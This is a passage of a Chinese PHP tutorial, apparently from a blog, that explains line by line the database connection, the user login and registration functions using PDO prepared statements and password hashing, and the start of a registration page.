invoke__">PDO</span>(<span class="string">&quot;mysql:host=<span class="subst">$host</span>;dbname=<span class="subst">$dbname</span>;charset=utf8&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;数据库连接失败: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>我们来看看这段代码怎样实现了应用程序与数据库之间的连接。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 第1-4行：定义数据库连接参数</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&#x27;localhost:3316&#x27;</span>; <span class="comment">// 数据库服务器地址和端口</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&#x27;blog_sql&#x27;</span>;     <span class="comment">// 要连接的数据库名称</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;blog&#x27;</span>;       <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;blog123&#x27;</span>;    <span class="comment">// 数据库密码</span></span><br></pre></td></tr></table></figure><ul><li>定义了连接数据库所需的配置信息。这样做的优点是修改配置时只需改动这一个文件。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第6-11行：尝试建立数据库连接</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 第7行：创建PDO实例（即连接数据库）</span></span><br><span class="line">    <span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&quot;mysql:host=<span class="subst">$host</span>;dbname=<span class="subst">$dbname</span>;charset=utf8&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br></pre></td></tr></table></figure><ul><li>使用PDO扩展连接MySQL数据库。<ul><li><code>new PDO(...)</code>：实例化一个PDO对象，传入数据源名称（DSN）、用户名和密码。</li><li><code>&quot;mysql:host=$host;dbname=$dbname;charset=utf8&quot;</code>：<ul><li><code>mysql:</code>：指定数据库驱动程序为MySQL。</li><li><code>charset=utf8</code>：设置连接字符集为UTF-8，<strong>这是防止中文乱码的关键</strong>。</li></ul></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第8行：设置PDO错误属性</span></span><br><span class="line">    <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br></pre></td></tr></table></figure><ul><li>配置PDO的错误处理模式。</li><li><code>PDO::ATTR_ERRMODE</code>：这是要设置的属性，这个属性决定了 PDO 在遇到错误时的行为方式。他有三种错误模式也就是第二个参数的选择有三个：<ul><li><code>PDO::ERRMODE_SILENT</code>：静默模式，发生错误时不抛出异常，需要手动检查错误。</li><li><code>PDO::ERRMODE_WARNING</code>：警告模式，发生错误时产生E_WARNING，脚本继续执行。</li><li><code>PDO::ERRMODE_EXCEPTION</code>：异常模式，发生错误时抛出 PDOException。</li><li>这里使用第三种模式是因为它能强制开发者处理错误，避免将敏感信息暴露给用户。</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第9-11行：捕获并处理连接异常</span></span><br><span class="line">&#125; <span class="keyword">catch</span>(PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;数据库连接失败: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>作用</strong>：异常处理，优雅地处理连接失败的情况。</p><ul><li><code>catch(PDOException $e)</code>：捕获在 <code>try</code>块中抛出的 <code>PDOException</code>类型的异常。</li><li><code>die(&quot;数据库连接失败: &quot; . $e-&gt;getMessage())</code>：如果连接失败，立即终止脚本运行，并显示一个友好的错误信息以及从异常对象中获取的具体错误原因 <code>$e-&gt;getMessage()</code>。</li></ul><h4 id="1-2-auth-php（用户认证模块）"><a href="#1-2-auth-php（用户认证模块）" class="headerlink" title="1.2 auth.php（用户认证模块）"></a>1.2 <code>auth.php</code>（用户认证模块）</h4><ul><li>这个文件是博客系统的核心安全与身份验证模块，负责处理用户登陆状态、登录、注册和密码重置等关键功能，具体代码展示如下：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isLoggedIn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$pdo</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ? OR email = ?&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$username</span>, <span class="variable">$username</span>]);</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user</span> &amp;&amp; <span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$userData</span>, <span class="variable">$pdo</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT id FROM users WHERE username = ? OR email = ?&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$userData</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$userData</span>[<span class="string">&#x27;email&#x27;</span>]]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;用户名或邮箱已存在&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$hashedPassword</span> = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$userData</span>[<span class="string">&#x27;password&#x27;</span>], PASSWORD_DEFAULT);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO users (username, email, password) VALUES (?, ?, ?)&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$userData</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$userData</span>[<span class="string">&#x27;email&#x27;</span>], <span class="variable">$hashedPassword</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;注册失败，请重试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>下面我们来一步步看看代码实现了什么功能。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 第1行：开启会话（Session）</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br></pre></td></tr></table></figure><ul><li><code>session_start()</code>函数：<ol><li>用于在PHP中启动一个新的会话或者重用现有的会话。</li><li>会话是一种在多个页面之间存储信息的方式，通常用于存储用户信息，他必须在任何输出到浏览器之前调用。</li><li>会话机制是允许服务器在多个页面请求之间存储用户的基本信息，是实现用户登陆状态保持的基础。</li></ol></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第3-6行：检查用户是否已登录的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isLoggedIn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>这是一个工具函数，用于快速检查当前访问者是否已经登录。</p></li><li><p><code>isset()</code>函数用来检查一个变量是否已经被声明，并且不是一个空值。</p></li><li><p>所以<code>isset($_SESSION[&#39;user_id&#39;]);</code>：用于检查变量<code>$_SESSION</code>中是否存在一个名为<code>user_id</code>的键。如果用户成功登录，这个值会被设置。</p></li><li><p><code>return</code>：如果 <code>user_id</code>存在，返回 <code>true</code>，表示用户已登录；否则返回 <code>false</code>。</p></li></ul><h5 id="1-2-1-用户登录函数"><a href="#1-2-1-用户登录函数" class="headerlink" title="1.2.1 用户登录函数"></a>1.2.1 用户登录函数</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第8-19行：用户登录函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$pdo</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 第9-11行：准备并执行SQL查询</span></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ? OR email = ?&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$username</span>, <span class="variable">$username</span>]);</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br></pre></td></tr></table></figure><ul><li><p>这个函数尝试使用用户名密码登录。</p></li><li><p><code>$pdo-&gt;prepare(...)</code>：创建一个预处理语句。使用占位符 <code>?</code>可以有效防止SQL注入攻击，这是至关重要的安全措施。</p></li><li><p><code>$stmt-&gt;execute([$username, $username])</code>：执行预处理语句，将两个 <code>$username</code>分别替换到SQL中的两个 <code>?</code>位置。</p></li><li><p><code>$user = $stmt-&gt;fetch()</code>：从查询结果中获取一行数据（即用户记录），存储在 <code>$user</code>变量中。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第13-17行：验证密码并设置会话</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user</span> &amp;&amp; <span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><ul><li><code>if ($user &amp;&amp; ...)</code>：首先检查是否找到了对应的用户（<code>$user</code>不为空），然后进行密码验证。</li><li><code>password_verify($password, $user[&#39;password&#39;])</code>：函数将用户输入的明文密码<code>$password</code>与数据库中存储的经过哈希加密的密码<code>$user[&#39;password&#39;]</code>进行比对，如果使用MD5或者<code>==</code>进行比较可能会出现问题。</li><li><code>$_SESSION[&#39;user_id&#39;] = ...</code>：密码验证成功后，将用户的唯一标识 <code>id</code>和 <code>username</code>存入会话变量。此后，在同一会话的任何页面中，都可以通过检查这些会话变量来判断用户身份，与开局信用的<code>session_start()</code>形成呼应。</li></ul><h5 id="1-2-2-用户注册函数"><a href="#1-2-2-用户注册函数" class="headerlink" title="1.2.2 用户注册函数"></a>1.2.2 用户注册函数</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第21-35行：用户注册函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$userData</span>, <span class="variable">$pdo</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 第22-25行：检查用户名或邮箱是否已存在</span></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT id FROM users WHERE username = ? OR email = ?&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$userData</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$userData</span>[<span class="string">&#x27;email&#x27;</span>]]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;用户名或邮箱已存在&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>注册用户时我们首先检查用户名或者邮箱是不是已经被使用过。</li><li>PDO的使用流程可以说和登录一样，首先是通过<code>$pdo-&gt;prepare</code>创建一个预处理SQL语句，通过<code>?</code>占位，之后就是通过<code>execute()</code>来替换<code>?</code>，并执行语句。</li><li><code>SELECT id ...</code>：查询是否存在相同的用户名或邮箱。只需查询 <code>id</code>字段就足够了，效率高。</li><li><code>if ($stmt-&gt;fetch())</code>：如果查询到任何结果，说明用户名或邮箱已被占用，函数立即返回一个错误消息字符串。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第27行：对密码进行哈希加密</span></span><br><span class="line">    <span class="variable">$hashedPassword</span> = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$userData</span>[<span class="string">&#x27;password&#x27;</span>], PASSWORD_DEFAULT);</span><br></pre></td></tr></table></figure><ul><li><code>password_hash(..., PASSWORD_DEFAULT)</code>：使用当前PHP的默认算法对明文密码进行哈希加密，一个系统基本的安全要求就是不要将明文密码存入数据库中。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第29-34行：执行插入操作</span></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO users (username, email, password) VALUES (?, ?, ?)&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$userData</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$userData</span>[<span class="string">&#x27;email&#x27;</span>], <span class="variable">$hashedPassword</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;注册失败，请重试&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>INSERT INTO ...</code>：准备插入数据的SQL语句。</li><li><code>$stmt-&gt;execute(...)</code>：执行插入操作。如果执行成功（通常返回 <code>true</code>），则返回 <code>true</code>表示注册成功；如果因未知原因失败（如数据库连接问题），则返回错误信息。</li></ul><h3 id="2-博客根目录下文件"><a href="#2-博客根目录下文件" class="headerlink" title="2. 博客根目录下文件"></a>2. 博客根目录下文件</h3><h4 id="2-1-register-php（用户注册）"><a href="#2-1-register-php（用户注册）" class="headerlink" title="2.1 register.php（用户注册）"></a>2.1 <code>register.php</code>（用户注册）</h4><ul><li>这部分主要用来实现用户注册功能，包括前端和后端实现。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/auth.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$userData</span> = [</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span> =&gt; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    ];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">register</span>(<span class="variable">$userData</span>, <span class="variable">$pdo</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php?registered=1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;注册 - 我的博客&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">        &lt;nav&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">logo</span>&quot;&gt;我的博客&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span>-<span class="title">links</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">login</span>.<span class="title">php</span>&quot;&gt;登录&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">header</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">main</span> <span class="title">class</span>=&quot;<span class="title">container</span> <span class="title">auth</span>-<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span>&gt;注册&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">error</span>): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">error</span>&quot;&gt;&lt;?= $<span class="title">error</span> ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">class</span>=&quot;<span class="title">auth</span>-<span class="title">form</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">username</span>&quot;&gt;用户名:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">email</span>&quot;&gt;邮箱:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">email</span>&quot; <span class="title">id</span>=&quot;<span class="title">email</span>&quot; <span class="title">name</span>=&quot;<span class="title">email</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">password</span>&quot;&gt;密码:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span>&quot;&gt;注册&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>下面我们详细说明一下后端实现的过程。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;includes/auth.php&#x27;</span>;  </span><br></pre></td></tr></table></figure><ul><li><code>require_once</code>是 PHP 中用于引入文件的语句，确保同一个文件只会被加载一次。</li><li><code>require_once &#39;includes/db.php&#39;;</code>引入数据库连接文件。</li><li><code>require_once &#39;includes/auth.php&#39;; </code> 引入认证功能文件。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$error</span> = <span 